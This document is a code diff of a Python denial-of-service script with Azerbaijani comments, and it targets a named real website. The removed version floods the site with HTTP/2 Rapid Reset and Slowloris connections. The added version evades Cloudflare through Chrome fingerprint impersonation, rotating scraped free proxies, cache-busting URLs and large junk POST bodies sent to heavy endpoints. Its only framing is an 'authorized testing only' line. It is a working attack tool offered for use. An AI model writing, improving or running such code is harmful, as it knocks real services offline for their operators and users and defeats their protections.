@@ -1,179 +1,199 @@
 #!/usr/bin/env python3
 """
-Heavy Layer-7 HTTP/2 Rapid Reset + Slowloris Combo
-Authorized Penetration Testing Tool Only
+Async Cloudflare Bypass / Origin Stress Tool (Authorized Testing Only)
+Stack: curl_cffi (Async JA3 + HTTP/2) + Proxy Rotation + Cache Bypass + Heavy POST
 """
 
-import socket
-import ssl
+import asyncio
 import random
-import threading
 import time
 import sys
+import threading
+import urllib.request
 
 try:
-    from h2.connection import H2Connection
-    from h2.events import StreamEnded, StreamReset
+    from curl_cffi.requests import AsyncSession
 except ImportError:
-    print("[!] pip install h2")
+    print("[!] pip install curl-cffi")
     sys.exit(1)
 
-# ------------------ CONFIG ------------------
-TARGET_HOST = "https://empro.az/#/login"  # Hədəf domen (SNI)
-TARGET_PORT = 443
-ORIGIN_IP = None                 # Əgər origin IP-ni bilsəniz buraya yazın, Cloudflare bypass olar
-# ORIGIN_IP = "1.2.3.4"          # Misal üçün origin IP
+# ------------------- CONFIG -------------------
+TARGET_DOMAIN = "https://empro.az/#/login"
 
-THREADS = 500                    # Bağlantı sayı (Worker)
-STREAMS_PER_CONN = 100           # Hər bağlantıda rapid reset sayı
-DURATION = 0                     # 0 = limitsiz (Dayandırmaq üçün CTRL+C)
+# Saytın ağır endpointləri (DB sorgu/CPU tükədən):
+# Əgər saytın "/api/invest", "/register", "/task/list" tipli ağır API-ləri varsa,
+# onları əlavə edin. Əks halda root "/" işləyər.
+ENDPOINTS = [
+    "/",
+    "/register",
+    "/login",
+    "/vip/buy",
+    "?page=vip",
+    "?action=getTasks",
+]
 
-# Slowloris parametrləri
-SLOWLORIS_SOCKETS = 1000
-SLOWLORIS_TIMEOUT = 10
+# Əgər öz residential proxy-ləriniz varsa, bura əlavə edin (http://ip:port formatında)
+CUSTOM_PROXIES = [
+    # "http://user:pass@ip:port",
+]
 
-# -------------------------------------------
+CONCURRENCY = 300        # Eyni vaxtda aktiv async worker sayı
+TIMEOUT = 12             # Saniyə
+POST_PAYLOAD_KB = 50     # Hər POST-da göndərilən boş data ölçüsü (KB)
 
-def get_target():
-    return ORIGIN_IP if ORIGIN_IP else TARGET_HOST
+# Proxy testi (ölü proxy-ləri atmaq üçün)
+PROXY_TEST_URL = "http://httpbin.org/ip"
+# ---------------------------------------------
 
-def rapid_reset_worker(wid):
-    """HTTP/2 Rapid Reset: Serverin HTTP/2 state machine-ini tükəndirir"""
-    context = ssl.create_default_context()
-    context.set_alpn_protocols(['h2'])
-    # Müasir brauzer TLS cipher suite imitasiyası
-    context.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
-    
-    while True:
+stats = {"ok": 0, "err": 0, "cf_block": 0, "origin_slow": 0, "http_5xx": 0}
+stats_lock = threading.Lock()
+
+UA_LIST = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+]
+
+def log(label, msg):
+    print(f"[{label}] {msg}")
+
+def update(stat_key, val=1):
+    with stats_lock:
+        stats[stat_key] += val
+        total = stats["ok"] + stats["err"] + stats["cf_block"]
+        if total % 250 == 0:
+            print(f"\n[*] Total: {total} | OK:{stats['ok']} | 5xx:{stats['http_5xx']} | SLOW:{stats['origin_slow']} | CF_Block:{stats['cf_block']} | Err:{stats['err']}\n")
+
+async def fetch_free_proxies():
+    """Pulsuz proxy siyahılarından HTTP proxy çəkir. Kaliteli proxy istəsəniz öz listinizi girin."""
+    sources = [
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http/socks5.txt",
+    ]
+    proxies = list(CUSTOM_PROXIES)
+    for src in sources:
         try:
-            sock = socket.create_connection((get_target(), TARGET_PORT), timeout=5)
-            if not ORIGIN_IP:
-                sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
-            else:
-                sock = context.wrap_socket(sock)  # Direct IP, SNI still sent for virtual hosting
-
-            conn = H2Connection()
-            conn.initiate_connection()
-            sock.sendall(conn.data_to_send())
-
-            # SETTINGS frame göndərmə - serverə deyirik ki, çoxlu axın gözləyin
-            conn.update_settings({
-                'ENABLE_PUSH': 0,
-                'MAX_CONCURRENT_STREAMS': 1000,  # Serveri aldatmaq üçün yüksək dəyər
-                'WINDOW_SIZE': 0  # Zero window - server cavab göndərə bilməsin, lakin resurs ayırır
-            })
-            sock.sendall(conn.data_to_send())
-
-            # Hər bağlantıda yüzlərlə axın aç və dərhal ləğv et
-            for _ in range(STREAMS_PER_CONN):
-                try:
-                    stream_id = conn.get_next_available_stream_id()
-                    if stream_id is None or stream_id > 2147483646:
-                        break
-                    
-                    # Fake GET sorğusu göndər (HEADERS frame)
-                    headers = [
-                        (':method', random.choice(['GET', 'POST', 'HEAD'])),
-                        (':path', f'/?_={random.randint(100000,999999)}&x={random.randint(100000,999999)}'),
-                        (':scheme', 'https'),
-                        (':authority', TARGET_HOST),
-                        ('user-agent', random.choice([
-                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0',
-                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0',
-                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0'
-                        ])),
-                        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
-                        ('accept-language', 'en-US,en;q=0.5'),
-                        ('accept-encoding', 'gzip, deflate, br'),
-                        ('referer', 'https://www.google.com/'),
-                        ('cache-control', 'no-cache'),
-                    ]
-                    conn.send_headers(stream_id, headers, end_stream=True)
-                    sock.sendall(conn.data_to_send())
-
-                    # DƏRHAL RST_STREAM göndər - bu "Rapid Reset" nöqtəsidir
-                    conn.reset_stream(stream_id)
-                    sock.sendall(conn.data_to_send())
-                    
-                except Exception:
-                    break
-
-            sock.close()
+            data = await asyncio.get_event_loop().run_in_executor(
+                None, lambda: urllib.request.urlopen(src, timeout=8).read().decode()
+            )
+            for line in data.splitlines():
+                line = line.strip()
+                if line and ":" in line:
+                    proxies.append(f"http://{line}")
         except Exception:
             pass
+    # Təkrarları sil, ilk 200-ni saxla
+    proxies = list(dict.fromkeys(proxies))[:200]
+    log("INFO", f"{len(proxies)} proxy yükləndi.")
+    return proxies
 
-def slowloris_worker(wid):
-    """Klassik Slowloris: Bağlantıları açıq saxla, server socket pool-unu doldur"""
-    context = ssl.create_default_context()
-    
+async def heavy_request(session: AsyncSession, proxy: str, endpoint: str):
+    """
+    Ağır sorğu: Cache bypass + böyük POST body + real Chrome fingerprint.
+    Cloudflare-ni keçib origin-ə yük salmaq üçün nəzərdə tutulub.
+    """
+    ts = int(time.time() * 1000)
+    rand = random.randint(100000, 999999)
+    # Cache bypass: hər URL unikaldır
+    url = f"{TARGET_DOMAIN}{endpoint}&_ts={ts}&_r={rand}&_cb={random.random()}"
+
+    headers = {
+        "User-Agent": random.choice(UA_LIST),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9,az;q=0.8,tr;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Referer": random.choice([
+            "https://www.google.com/search?q=disney+plus",
+            "https://www.bing.com/",
+            "https://www.facebook.com/",
+            TARGET_DOMAIN,
+        ]),
+        "Origin": TARGET_DOMAIN,
+        "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
+        "Pragma": "no-cache",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+
+    # Origin serveri tükəndirmək üçün ağır POST payload (boş data)
+    # Database yazma, validasiya, loglama işləri aparan endpointlərdə CPU/Disk yorar
+    payload = "x=" + ("A" * (POST_PAYLOAD_KB * 1024)) + "&submit=1&action=process"
+
+    try:
+        start = time.time()
+        r = await session.post(
+            url,
+            headers=headers,
+            data=payload,
+            proxy=proxy,
+            timeout=TIMEOUT,
+            impersonate="chrome110",  # Real Chrome JA3 + HTTP/2 fingerprint
+            allow_redirects=True,
+        )
+        elapsed = time.time() - start
+
+        status = r.status_code
+        if status in (502, 503, 504):
+            update("http_5xx")
+            log("WIN", f"SERVER ERROR {status} -> Origin çökür! ({elapsed:.1f}s)")
+        elif status == 429 or status == 403:
+            update("cf_block")
+        else:
+            update("ok")
+            # Əgər cavab 2 saniyədən çoxsa, origin server artıq tükənməyə başlayıb
+            if elapsed > 2.5:
+                update("origin_slow")
+                log("SLOW", f"Response {elapsed:.1f}s (Origin tükənir)")
+
+    except asyncio.TimeoutError:
+        update("origin_slow")
+        log("SLOW", "Timeout -> Origin server cavab verə bilmir.")
+    except Exception:
+        update("err")
+
+async def worker_loop(session: AsyncSession, proxy: str, sem: asyncio.Semaphore):
+    """Bir proxy üzərində sonsuz döngü ilə fərqli endpointləri bombalayır."""
     while True:
-        sockets = []
-        try:
-            # Bir worker minlərlə yavaş bağlantı açır
-            for _ in range(SLOWLORIS_SOCKETS // THREADS):
-                try:
-                    s = socket.create_connection((get_target(), TARGET_PORT), timeout=SLOWLORIS_TIMEOUT)
-                    if not ORIGIN_IP:
-                        s = context.wrap_socket(s, server_hostname=TARGET_HOST)
-                    else:
-                        s = context.wrap_socket(s)
-                    
-                    # HTTP/1.1 Slowloris
-                    http_ver = random.choice([b"HTTP/1.1", b"HTTP/1.0"])
-                    s.send(f"GET /?r={random.randint(1,999999)} {http_ver}\r\n".encode())
-                    s.send(f"Host: {TARGET_HOST}\r\n".encode())
-                    s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
-                    s.send(b"Accept: text/html,*/*\r\n")
-                    # Header-i yarımçıq saxlayırıq - server request-in bitməsini gözləyir
-                    # Hər 10-15 saniyədə bir xarakter göndəririk ki, timeout olmasın
-                    sockets.append(s)
-                except:
-                    pass
+        async with sem:
+            ep = random.choice(ENDPOINTS)
+            await heavy_request(session, proxy, ep)
 
-            # Bağlantıları açıq saxla və ara-sıra boşluq göndər
-            for _ in range(30):  # 30 * 5 saniyə = 2.5 dəqiqə
-                time.sleep(5)
-                for s in sockets[:]:
-                    try:
-                        s.send(b"X-a: keep\r\n")
-                    except:
-                        sockets.remove(s)
-                        
-            for s in sockets:
-                try:
-                    s.close()
-                except:
-                    pass
-                    
-        except Exception:
-            pass
+async def main():
+    print("=" * 60)
+    print("  ORIGIN STRESS / Cloudflare Bypass (curl_cffi Async)")
+    print("=" * 60)
+    print(f"Target    : {TARGET_DOMAIN}")
+    print(f"Endpoints : {ENDPOINTS}")
+    print(f"Payload   : {POST_PAYLOAD_KB} KB (POST data)")
+    print(f"Workers   : {CONCURRENCY}")
+    print(f"[*] Proxy'siz bu test Cloudflare edge-ə zərər yetirməz, origin-ə çatmalıdır.")
+    print(f"[*] Proxy: Öz residential proxy-lərinizi CUSTOM_PROXIES listinə əlavə edin.\n")
 
-def stats_reporter():
-    import os
-    start = time.time()
-    while True:
-        time.sleep(5)
-        print(f"[*] Uptime: {int(time.time()-start)}s | Workers active. Check target manually for 502/504.")
+    proxies = await fetch_free_proxies()
+    if not proxies:
+        print("[!] Heç bir proxy tapılmadı. Kodu dayandırmaq yerinə, sadəcə direct mode işləyir...")
+        proxies = [None]
+
+    sem = asyncio.Semaphore(CONCURRENCY)
+
+    log("INFO", f"Sessiya yaradılır (impersonate=chrome110)...")
+    # curl_cffi bir sessiya üzərindən connection pool idarə edir
+    async with AsyncSession(impersonate="chrome110") as session:
+        tasks = []
+        for proxy in proxies:
+            for _ in range(3):  # Hər proxy-dən 3 paralel worker
+                t = asyncio.create_task(worker_loop(session, proxy, sem))
+                tasks.append(t)
+
+        await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
-    if ORIGIN_IP:
-        print(f"[!] DIRECT ORIGIN MODE: {ORIGIN_IP} (Cloudflare bypassed)")
-    else:
-        print(f"[!] PROXY MODE: {TARGET_HOST} via Cloudflare")
-        print(f"    TIP: Set ORIGIN_IP variable to bypass Cloudflare entirely.")
-    
-    print(f"[*] Launching {THREADS} workers...")
-    print(f"[*] Mode: HTTP/2 Rapid Reset ({STREAMS_PER_CONN} streams/conn) + Slowloris")
-    print("[*] Press CTRL+C to stop.\n")
-
-    # Rapid Reset ordusu
-    for i in range(THREADS):
-        t = threading.Thread(target=rapid_reset_worker, args=(i,), daemon=True)
-        t.start()
-
-    # Slowloris ordusu (əlaqə tükənməsi üçün)
-    for i in range(THREADS // 2):
-        t = threading.Thread(target=slowloris_worker, args=(i,), daemon=True)
-        t.start()
-
-    stats_reporter()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Dayandırıldı.")
